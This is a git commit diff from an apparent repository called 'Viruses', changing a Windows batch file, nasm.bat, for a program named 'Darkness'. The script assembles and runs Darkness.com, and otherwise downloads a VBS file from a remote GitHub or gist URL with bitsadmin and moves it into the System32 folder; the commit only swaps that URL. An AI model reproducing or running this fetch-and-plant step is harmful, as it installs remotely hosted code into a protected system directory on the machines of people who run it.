0ca7cc91b309f690043a256e6a294bd0a42f962b
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-14 09:18:59 +0100

    Darkness

--- Darkness/nasm.bat
+++ Darkness/nasm.bat
@@ -6,7 +6,7 @@ if %errorlevel% == 0 (
     nasm -f bin -o Darkness.com Darkness.asm
     Darkness.com
 ) else (
-    set URL=https://raw.githubusercontent.com/INeddHelp/Viruses/master/Darkness/namsinstaller.vbs
+    set URL=https://gist.github.com/INeddHelp/b7485cc1ac3a14a20ddccc3ceef9442d
     set DESTINATION=%temp%\namsinstaller.vbs
     bitsadmin /transfer namsdownload /download /priority normal %URL% %DESTINATION%
     move /y %DESTINATION% %windir%\System32\namsinstaller.vbs
